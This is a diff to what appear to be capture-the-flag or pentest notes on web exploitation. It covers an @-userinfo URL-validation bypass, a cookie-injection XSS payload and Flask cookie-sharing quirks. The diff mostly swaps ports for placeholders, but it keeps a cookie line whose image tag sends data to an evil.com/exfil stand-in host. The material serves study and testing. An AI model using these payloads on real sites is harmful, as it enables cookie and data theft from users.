@@ -45,10 +45,10 @@ Look for endpoints that:
 ## URL Validation Bypass: @-userinfo Trick
 
 ```
-http://127.0.0.1:7000@evil.com/exploit.html
+http://127.0.0.1:APP_PORT@attacker.example/exploit.html
 ```
-- Python `str.startswith("http://127.0.0.1:7000")` passes ✓
-- Browser navigates to `evil.com` (userinfo is ignored, host is after @)
+- naive `str.startswith("http://127.0.0.1:APP_PORT")` validation passes ✓
+- Browser navigates to `attacker.example` (userinfo is parsed before the real host after `@`)
 - Bot error "invalid argument" = Selenium webdriver (URL format issue)
 - Works with any external host as the real destination
 
@@ -84,7 +84,7 @@ for (let i = 0; i < 200; i++) {
 // Now set our malicious banner cookie
 document.cookie = "banner=<img src=http://evil.com/exfil?d=; path=/status";
 // Navigate to the page that renders the cookie value
-window.location = "http://127.0.0.1:7001/status";
+window.location = "http://127.0.0.1:STATUS_PORT/status";
 ```
 
 Note: `document.cookie` works even with `connect-src 'none'` CSP (it's not a network request).
@@ -192,7 +192,7 @@ Use [dompurify-3.3.1-mxss-verification.md](dompurify-3.3.1-mxss-verification.md)
 ## Flask/Werkzeug Quirks
 
 - `request.headers.get("X-Custom-Header")` is CASE-INSENSITIVE
-  - `x-desk-action: view` works same as `X-Desk-Action: view`
+  - `x-required-action: view` works same as `X-Required-Action: view`
 - `make_response(string)` without mimetype defaults to `text/html`
 - Cookies are host-scoped, NOT port-scoped (shared across ports on same host)
 - `secrets.token_urlsafe(18)` = 24 chars, cryptographically secure (can't predict nonces)
@@ -200,7 +200,7 @@ Use [dompurify-3.3.1-mxss-verification.md](dompurify-3.3.1-mxss-verification.md)
 ## Multi-Port Cookie Sharing
 
 Browsers share cookies across ports on the same host:
-- Cookie set on `127.0.0.1:7000` IS sent to `127.0.0.1:7001`
+- Cookie set on `127.0.0.1:APP_PORT` IS sent to `127.0.0.1:STATUS_PORT`
 - Cookie set for `127.0.0.1` is NOT sent to `localhost` (different host)
 - HttpOnly cookies can't be read/modified by JS, but JS CAN set a new cookie with same name (creating duplicates)
 - Flask/Werkzeug `request.cookies.get(name)` returns FIRST occurrence in Cookie header
